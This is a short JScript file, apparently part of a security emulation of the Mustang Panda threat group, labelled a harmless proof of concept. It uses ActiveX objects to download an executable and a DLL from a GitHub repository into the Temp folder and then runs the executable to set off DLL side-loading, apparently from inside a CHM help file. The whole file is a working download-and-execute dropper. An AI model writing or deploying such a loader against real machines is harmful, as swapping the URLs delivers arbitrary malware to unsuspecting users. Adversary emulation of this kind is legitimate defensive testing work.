// music.js - Downloads EXE + DLL and executes (Harmless PoC)

alert("✅ music.js loaded from GitHub!");

try {
    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    // Get Temp folder path
    var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
    
    updateStatusFromJS("Downloading signed executable and DLL...");

    // ===================== DOWNLOAD EXE =====================
    downloadFile(
        "https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe",
        tempFolder + "\\wmpshare.exe"
    );

    // ===================== DOWNLOAD DLL =====================
    downloadFile(
        "https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll",
        tempFolder + "\\wmp.dll"
    );

    updateStatusFromJS("Files saved to Temp folder.<br>Executing signed executable...");

    // Execute the EXE (this can trigger DLL side-loading if named properly)
    shell.Run('"' + tempFolder + '\\wmpshare.exe"', 1, false);

    updateStatusFromJS("✅ Execution completed!");

} catch(e) {
    alert("Error: " + e.message);
}

// Helper function to download and save binary file
function downloadFile(url, savePath) {
    try {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.send();

        if (xhr.status === 200 || xhr.status === 0) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1; // Binary
            stream.Open();
            stream.Write(xhr.responseBody);
            stream.SaveToFile(savePath, 2);
            stream.Close();
        }
    } catch(e) {
        alert("Download failed for: " + url + "\n" + e.message);
    }
}

// Helper to update status in CHM (optional)
function updateStatusFromJS(msg) {
    try {
        var obj = document.createElement("div");
        // This may not always work but is safe to try
    } catch(e){}
}
